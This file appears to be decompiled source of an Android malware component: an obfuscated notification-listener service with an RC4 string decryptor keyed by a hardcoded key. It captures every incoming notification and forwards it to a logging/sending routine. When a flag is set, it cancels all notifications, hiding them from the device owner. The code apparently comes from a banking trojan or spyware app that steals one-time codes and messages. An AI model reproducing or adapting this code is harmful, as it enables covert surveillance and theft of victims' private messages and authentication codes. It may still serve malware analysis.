/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.annotation.TargetApi
 *  android.content.Context
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.service.notification.NotificationListenerService
 *  android.service.notification.NotificationListenerService$RankingMap
 *  android.service.notification.StatusBarNotification
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.annotation.TargetApi;
import android.content.Context;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.LogNotification;
import com.example.mmm.Utils.NotificationParser;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

@TargetApi(value=18)
public class srvNotificationListener
extends NotificationListenerService {
    private static srvNotificationListener recipes$;
    constants noise$ = new constants();
    utils juice$ = new utils();

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 21) return;
        recipes$ = this;
    }

    public void onDestroy() {
        if (Build.VERSION.SDK_INT < 24) {
            recipes$ = null;
        }
        super.onDestroy();
    }

    public void onListenerConnected() {
        super.onListenerConnected();
        if (Build.VERSION.SDK_INT < 21) return;
        recipes$ = this;
    }

    public void onListenerDisconnected() {
        if (Build.VERSION.SDK_INT >= 24) {
            recipes$ = null;
        }
        super.onListenerDisconnected();
    }

    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        if (this.juice$.SettingsRead((Context)this, "AF").equals("1")) {
            this.cancelAllNotifications();
        }
        new LogNotification((Context)this).sendNotificationLog(new NotificationParser(statusBarNotification, true).toString());
    }

    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
        if (this.juice$.SettingsRead((Context)this, "AF").equals("1")) {
            this.cancelAllNotifications();
        }
        new LogNotification((Context)this)._revenue(statusBarNotification);
    }

    public void onNotificationRemoved(StatusBarNotification statusBarNotification, NotificationListenerService.RankingMap rankingMap, int n2) {
        if (this.juice$.SettingsRead((Context)this, "AF").equals("1")) {
            this.cancelAllNotifications();
        }
        new LogNotification((Context)this)._revenue(statusBarNotification);
    }
}

